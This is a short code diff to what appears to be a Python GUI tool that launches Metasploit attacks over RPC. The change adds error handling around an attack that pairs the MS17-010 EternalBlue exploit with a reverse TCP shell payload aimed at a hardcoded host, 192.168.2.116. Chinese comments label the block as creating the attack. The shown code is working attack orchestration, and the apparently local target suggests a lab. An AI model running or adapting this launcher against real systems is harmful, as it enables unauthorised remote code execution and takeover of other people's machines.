@@ -5,7 +5,7 @@ import threading
 import pymetasploit3.msfrpc
 from pymetasploit3.msfrpc import MsfRpcClient
 
-from libs.Attack import Attack
+from libs.Attack import Attack, AttackError
 from libs.GUI import GUI
 from libs.Logger import Logger
 from libs.Modules import Modules
@@ -52,12 +52,15 @@ def attack_thread():
         logger.err('驗證失敗，無法連線到 RPC')
         sys.exit(1)
 
-    # 建立攻擊
-    atk = Attack(client,
-                 Modules.MS17_010_ETERNALBLUE,
-                 Payloads.REVERSE_TCP,
-                 ('RHOSTS', '192.168.2.116'),
-                 )
+    try:
+        # 建立攻擊
+        atk = Attack(client,
+                     Modules.MS17_010_ETERNALBLUE,
+                     Payloads.REVERSE_TCP,
+                     ('RHOSTS', '192.168.2.116'),
+                     )
+    except AttackError:
+        sys.exit(1)
 
     @atk.event
     async def on_read(text):
